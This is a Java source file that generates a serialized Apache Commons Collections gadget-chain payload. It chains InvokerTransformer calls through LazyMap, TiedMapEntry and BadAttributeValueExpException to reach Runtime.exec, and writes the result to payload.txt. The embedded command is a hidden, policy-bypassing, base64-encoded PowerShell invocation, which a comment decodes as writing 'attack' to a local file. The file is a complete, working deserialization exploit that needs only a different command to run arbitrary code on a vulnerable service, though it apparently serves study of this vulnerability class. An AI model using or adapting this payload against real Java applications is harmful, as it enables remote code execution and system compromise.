import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class TransformedMapPayload {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 更新参数为Runtime.class
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ZQBjAGgAbwAgACcAYQB0AHQAYQBjAGsAJwAgAD4AIABEADoAXABjAG8AZABlAFwAagBhAHYAYQBcAGMAYwBEAGUAcwBlAHIAaQBhAGwAaQB6AGUAXAByAGUAcwAuAHQAeAB0AA=="})
        };
        // http://www.jackson-t.ca/runtime-exec-payloads.html
        // echo 'attack' > D:\code\java\ccDeserialize\res.txt

        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "123456");




        try(
                FileOutputStream fos = new FileOutputStream("payload.txt");
                ObjectOutputStream oos = new ObjectOutputStream(fos);
        ){
            BadAttributeValueExpException val = new BadAttributeValueExpException(null);
            Field valfield = val.getClass().getDeclaredField("val");
            valfield.setAccessible(true);
            valfield.set(val, entry);
            Class<? extends Transformer> aClass = chainedTransformer.getClass();

            Field iTransformers = aClass.getDeclaredField("iTransformers");
            iTransformers.setAccessible(true);
            iTransformers.set(chainedTransformer,transformers);
            oos.writeObject(val);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
